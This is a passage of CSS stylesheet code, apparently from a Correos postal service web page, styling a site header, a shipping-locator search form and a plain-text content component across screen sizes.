			[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header {
				width: 100%;
				-webkit-box-sizing: border-box;
				box-sizing: border-box
			}

			@media (min-width: 1024px) {

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header:nth-child(2).--with-switch>a.sc-correos-cdk-core-header,
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header:nth-child(2).--with-switch>button.sc-correos-cdk-core-header {
					border-top: 1px solid rgba(128, 128, 128, 0.5)
				}
			}

			@media (min-width: 1024px) {

				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header:nth-child(2).--no-border>a.sc-correos-cdk-core-header,
				[variant=site].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header:nth-child(2).--no-border>button.sc-correos-cdk-core-header {
					border-top: 0
				}
			}

			[variant=prepay].sc-correos-cdk-core-header-h {
				height: 88px
			}

			@media (min-width: 1024px) {
				[variant=prepay].sc-correos-cdk-core-header-h {
					height: 120px
				}
			}

			[variant=prepay].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
				top: 88px
			}

			[variant=prepay].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-langs.sc-correos-cdk-core-header {
				margin-bottom: 32px
			}

			@media (min-width: 640px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
					display: none
				}
			}

			[variant=prepay].sc-correos-cdk-core-header-h .cdk-header-band.sc-correos-cdk-core-header .cdk-header-band_content.sc-correos-cdk-core-header {
				padding-left: 32px
			}

			@media (min-width: 1024px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header-band.sc-correos-cdk-core-header .cdk-header-band_content.sc-correos-cdk-core-header {
					padding-left: 40px
				}
			}

			[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
				display: none !important
			}

			@media (max-width: 640px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-nav-button.sc-correos-cdk-core-header {
					display: block !important
				}
			}

			@media (max-width: 640px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-start.sc-correos-cdk-core-header .cdk-header-menu.sc-correos-cdk-core-header {
					display: none
				}
			}

			[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header {
				position: relative
			}

			[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--login-item.sc-correos-cdk-core-header {
				height: 32px;
				margin-right: 12px;
				border-right: 1px solid #d8d8d8
			}

			@media (max-width: 640px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--login-item.sc-correos-cdk-core-header {
					margin-right: 8px
				}
			}

			@media (min-width: 640px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--login-item.sc-correos-cdk-core-header {
					height: 32px
				}
			}

			@media (min-width: 1024px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--login-item.sc-correos-cdk-core-header {
					height: 50px
				}
			}

			[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--language-item.sc-correos-cdk-core-header {
				padding-right: 8px;
				border-right: 1px solid #d8d8d8
			}

			@media (max-width: 640px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--language-item.sc-correos-cdk-core-header {
					display: none !important;
					border-right: none
				}
			}

			@media (min-width: 640px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--language-item.sc-correos-cdk-core-header {
					height: 32px
				}
			}

			@media (min-width: 1024px) {
				[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--language-item.sc-correos-cdk-core-header {
					height: 50px
				}
			}

			[variant=prepay].sc-correos-cdk-core-header-h .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-language-selector.sc-correos-cdk-core-header {
				display: none
			}

			.cdk-nav-lv-img-setting.sc-correos-cdk-core-header {
				width: 24px;
				margin-right: 1rem
			}

			@media (min-width: 1024px) {
				.cdk-nav-lv-third-columns.sc-correos-cdk-core-header {
					margin-left: 32px
				}
			}

			.cdk-header-logo-container.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				-ms-flex-align: center;
				align-items: center;
				height: 100%;
				width: 56px;
				display: flex;
				position: relative;
				color: var(--_cdk-core-header-color-logo)
			}

			.cdk-header-logo-container.sc-correos-cdk-core-header::after {
				content: "";
				position: absolute;
				width: 1px;
				height: 33px;
				right: -5px;
				background-color: #d8d8d8
			}

			.cdk-header-logo-container.--avoid-before.sc-correos-cdk-core-header::after {
				content: "";
				position: absolute;
				width: 0px !important;
				height: 33px;
				right: -5px;
				background-color: #d8d8d8
			}

			@media (min-width: 640px) {
				.cdk-header-logo-container.sc-correos-cdk-core-header::after {
					right: -12px
				}
			}

			@media (min-width: 1024px) {
				.cdk-header-logo-container.sc-correos-cdk-core-header {
					min-width: 80px
				}

				.cdk-header-logo-container.sc-correos-cdk-core-header::after {
					right: -16px;
					height: 48px
				}
			}

			.cdk-header-logo.sc-correos-cdk-core-header {
				width: 37px;
				height: 37px;
				color: var(--_cdk-core-header-color-logo)
			}

			@media (min-width: 640px) {
				.cdk-header-logo.sc-correos-cdk-core-header {
					width: 40px;
					height: 40px
				}
			}

			@media (min-width: 1024px) {
				.cdk-header-logo.sc-correos-cdk-core-header {
					width: 48px;
					height: 46px
				}
			}
		</style>
		<style>
			@charset "UTF-8";

			.sc-correos-cdk-shipping-locator-h {
				--_cdk-shipping-locator-background-color: var(--cdk-shipping-locator-bg, white);
				--_cdk-shipping-locator-box-shadow: var(--cdk-shipping-locator-box-shadow, 0 10px 20px 0 red);
				--_cdk-shipping-locator-color-label: var(--cdk-shipping-locator-color-label, orange);
				--_cdk-shipping-locator-color-link: var(--cdk-shipping-locator-color-link, green);
				--_cdk-shipping-locator-color-title: var(--cdk-shipping-locator-color-title, purple);
				--_cdk-shipping-locator-color-icon-search: var(--cdk-shipping-locator-color-icon-search, pink);
				--_cdk-shipping-locator-color-icon-close: var(--cdk-shipping-locator-color-icon-close, blue);
				--_cdk-shipping-locator-color-title-menu: var(--cdk-shipping-locator-color-title-menu, brown)
			}

			.sc-correos-cdk-shipping-locator-h {
				display: block;
				width: 100%
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator {
				position: relative
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator {
					position: initial
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator {
					position: initial
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-decorator-base.sc-correos-cdk-shipping-locator {
				min-height: 296px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-decorator-base.sc-correos-cdk-shipping-locator {
					display: none
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-decorator-base--title.sc-correos-cdk-shipping-locator {
				min-height: 346px
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-decorator.sc-correos-cdk-shipping-locator {
				width: 100%;
				position: absolute;
				bottom: -18px;
				height: 30px;
				overflow: hidden;
				z-index: 2
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-decorator.sc-correos-cdk-shipping-locator>div.sc-correos-cdk-shipping-locator {
				position: absolute;
				left: 50%;
				-webkit-transform: translateX(-50%);
				transform: translateX(-50%);
				width: 110%;
				height: 100%;
				border-radius: 50%/100%;
				border-top-left-radius: 0;
				border-top-right-radius: 0
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-container.sc-correos-cdk-shipping-locator {
				position: absolute;
				z-index: 3;
				width: 100%;
				top: 40px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-container.sc-correos-cdk-shipping-locator {
					position: initial;
					z-index: initial;
					width: initial;
					top: initial
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-container.sc-correos-cdk-shipping-locator {
					position: initial;
					z-index: initial;
					width: initial;
					top: initial
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator {
				width: 100%;
				padding: 16px;
				border-radius: 8px;
				background-color: var(--_cdk-shipping-locator-background-color);
				-webkit-box-shadow: var(--_cdk-shipping-locator-box-shadow);
				box-shadow: var(--_cdk-shipping-locator-box-shadow);
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator {
					padding: 24px 0;
					border-radius: initial;
					-webkit-box-shadow: initial;
					box-shadow: initial
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator {
					padding: 24px 0;
					border-radius: initial;
					-webkit-box-shadow: initial;
					box-shadow: initial
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-fieldset.sc-correos-cdk-shipping-locator {
				border: 0;
				padding: 0;
				margin: 0;
				min-width: 0
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-wrapper.sc-correos-cdk-shipping-locator {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-wrapper.sc-correos-cdk-shipping-locator {
					-ms-flex-direction: row;
					flex-direction: row
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-label.sc-correos-cdk-shipping-locator {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				display: -ms-flexbox;
				display: flex;
				color: var(--_cdk-shipping-locator-color-label);
				font-size: 1.125rem;
				line-height: 1.625rem;
				margin-bottom: 13px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-label.sc-correos-cdk-shipping-locator {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-input.sc-correos-cdk-shipping-locator {
				margin-bottom: 16px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-input.sc-correos-cdk-shipping-locator {
					margin-right: 24px;
					width: 80%;
					margin-bottom: 0
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-input.sc-correos-cdk-shipping-locator {
					margin-right: 24px;
					width: 83%;
					margin-bottom: 0
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-btn.sc-correos-cdk-shipping-locator {
				margin-bottom: 16px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-btn.sc-correos-cdk-shipping-locator {
					margin-bottom: 0;
					width: 20%
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-btn.sc-correos-cdk-shipping-locator {
					margin-bottom: 0;
					width: 17%
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-section-link.sc-correos-cdk-shipping-locator {
				display: -ms-flexbox;
				display: flex
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-section-link.sc-correos-cdk-shipping-locator {
					display: none
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-link.sc-correos-cdk-shipping-locator {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				color: initial;
				text-decoration: none;
				color: var(--_cdk-shipping-locator-color-link);
				font-size: 0.875rem;
				line-height: 1.375rem;
				text-decoration: underline
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator .cdk-link.sc-correos-cdk-shipping-locator {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-title-menu.sc-correos-cdk-shipping-locator {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between;
				margin-bottom: 24px
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-new-title.sc-correos-cdk-shipping-locator {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				color: var(--_cdk-shipping-locator-color-title-menu);
				font-size: 1.125rem;
				line-height: 1.625rem
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-new-title.sc-correos-cdk-shipping-locator {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-close.sc-correos-cdk-shipping-locator {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-close.sc-correos-cdk-shipping-locator::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .icon-close.sc-correos-cdk-shipping-locator {
				color: var(--_cdk-shipping-locator-color-icon-close);
				cursor: pointer
			}

			.sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-title-section.sc-correos-cdk-shipping-locator {
				display: none
			}

			[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-decorator-base.sc-correos-cdk-shipping-locator {
				position: relative;
				min-height: 56px
			}

			@media (min-width: 640px) {
				[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-decorator-base.sc-correos-cdk-shipping-locator {
					display: none
				}
			}

			[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-decorator.sc-correos-cdk-shipping-locator {
				width: 100%;
				position: absolute;
				bottom: -18px
			}

			[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator {
				display: none
			}

			@media (min-width: 640px) {
				[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator {
					display: -ms-flexbox;
					display: flex
				}
			}

			@media (min-width: 640px) {
				[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-form.sc-correos-cdk-shipping-locator {
					display: -ms-flexbox;
					display: flex
				}
			}

			[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-title-section.sc-correos-cdk-shipping-locator {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				padding-top: 8px
			}

			[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-title.sc-correos-cdk-shipping-locator {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				color: initial;
				text-decoration: none;
				color: var(--_cdk-shipping-locator-color-title);
				font-size: 0.875rem;
				line-height: 1.375rem;
				font-weight: bold
			}

			@media (min-width: 1024px) {
				[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-title.sc-correos-cdk-shipping-locator {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			[data-current=true].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .icon-search.sc-correos-cdk-shipping-locator {
				color: var(--_cdk-shipping-locator-color-icon-search)
			}

			.sc-correos-cdk-shipping-locator-h .d-none.sc-correos-cdk-shipping-locator {
				display: none
			}

			[size=md].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-container.sc-correos-cdk-shipping-locator .cdk-title-menu.sc-correos-cdk-shipping-locator,
			[size=lg].sc-correos-cdk-shipping-locator-h .cdk-shipping-locator.sc-correos-cdk-shipping-locator .cdk-container.sc-correos-cdk-shipping-locator .cdk-title-menu.sc-correos-cdk-shipping-locator {
				display: none
			}
		</style>
		<style>
			.sc-correos-ui-plain-text-h {
				--_ui-plaintext-color-icon: var(--ui-plaintext-color-icon, blue);
				--_ui-plaintext-color-text: var(--ui-plaintext-color-text, yellow);
				--_ui-plaintext-color-bg: var(--ui-plaintext-color-bg, red)
			}

			.sc-correos-ui-plain-text-h {
				--_ui-plain-text-color: var(--ui-plain-text-color, var(--theme-color-strongGrey, magenta));
				--_ui-plain-text-link-color: var(--ui-plain-text-link-color, green);
				--_ui-plain-text-link-decoration: var(--ui-plain-text-link-decoration, none);
				--_ui-plain-text-link-font-weight: var(--ui-plain-text-link-font-weight, bold);
				--_ui-plain-text-font-weight: var(--ui-plain-text-font-weight, 400);
				--_ui-plain-text-text-align: var(--ui-plain-text-text-align, initial);
				display: block;
				width: 100%
			}

			.sc-correos-ui-plain-text-h .ui-container.sc-correos-ui-plain-text {
				color: var(--_ui-plain-text-color);
				text-align: var(--_ui-plain-text-text-align);
				-ms-flex-pack: center;
				justify-content: center
			}

			.sc-correos-ui-plain-text-h .--max-width.sc-correos-ui-plain-text {
				max-width: 864px
			}

			.sc-correos-ui-plain-text-h .active-margin.sc-correos-ui-plain-text {
				margin-bottom: 16px
			}

			@media (min-width: 640px) {
				.sc-correos-ui-plain-text-h .active-margin.sc-correos-ui-plain-text {
					margin-bottom: 24px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-plain-text-h .active-margin.sc-correos-ui-plain-text {
					margin-bottom: 24px
				}
			}

			.sc-correos-ui-plain-text-h correos-ui-button.sc-correos-ui-plain-text {
				display: none
			}

			@media (max-width: 639px) {
				.sc-correos-ui-plain-text-h .button-wrapper.sc-correos-ui-plain-text {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-pack: center;
					justify-content: center
				}

				.sc-correos-ui-plain-text-h correos-ui-button.sc-correos-ui-plain-text {
					display: inline
				}

				.sc-correos-ui-plain-text-h .content-body.sc-correos-ui-plain-text {
					max-height: 240px
				}

				.sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text {
					overflow: hidden;
					position: relative
				}

				.sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
					content: "";
					position: absolute;
					width: 100%;
					height: 80px;
					background: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(var(--_ui-plaintext-color-bg)));
					background: linear-gradient(180deg, rgba(255, 255, 255, 0) 0%, var(--_ui-plaintext-color-bg) 100%);
					bottom: 0
				}
			}

			@media (max-width: 639px) and (min-width: 640px) {
				.sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
					height: 104px
				}
			}

			@media (max-width: 639px) and (min-width: 1024px) {
				.sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
					height: 104px
				}
			}

			@media (max-width: 639px) {
				.sc-correos-ui-plain-text-h .overflow-gradient.open.sc-correos-ui-plain-text {
					max-height: 100%;
					overflow: auto
				}

				.sc-correos-ui-plain-text-h .overflow-gradient.open.sc-correos-ui-plain-text:before {
					display: none
				}
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] {
				font-weight: var(--_ui-plain-text-font-weight)
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul {
				list-style: none
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul>li {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				color: var(--_ui-plaintext-color-text);
				margin-bottom: 16px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul>li {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul>li i.icon-bullet_circle {
				display: inline-block;
				vertical-align: middle;
				font-size: 16px;
				color: var(--_ui-plaintext-color-icon);
				margin-right: 16px
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ul>li ul {
				list-style: none
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ol {
				list-style: none;
				counter-reset: li
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ol li {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				counter-increment: li;
				color: var(--_ui-plaintext-color-text)
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ol li {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext]>ol li::before {
				content: counter(li) ".";
				color: var(--_ui-plaintext-color-icon);
				font-size: 16px;
				margin-right: 24px;
				vertical-align: top
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] a {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				color: initial;
				text-decoration: none;
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				font-weight: bold;
				color: var(--_ui-plain-text-link-color);
				-webkit-text-decoration: var(--_ui-plain-text-link-decoration);
				text-decoration: var(--_ui-plain-text-link-decoration);
				font-weight: var(--_ui-plain-text-link-font-weight);
				text-decoration: underline
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] a {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] p {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem;
				margin-bottom: 24px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] p {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] p:last-child {
				margin-bottom: 0
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] correos-ui-button {
				margin-bottom: 24px
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] correos-ui-button:last-child {
				margin-bottom: 0
			}

			.sc-correos-ui-plain-text-h .sc-correos-ui-plain-text-s>[slot=plaintext] correos-ui-button a {
				text-decoration: none
			}

			.sc-correos-ui-plain-text-h[variant=light-text] .sc-correos-ui-plain-text-s>[slot=plaintext] {
				font-weight: 300
			}

			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .button-wrapper.sc-correos-ui-plain-text {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center
			}

			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h correos-ui-button.sc-correos-ui-plain-text {
				display: inline
			}

			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .content-body.sc-correos-ui-plain-text {
				max-height: 432px
			}

			@media (min-width: 640px) {
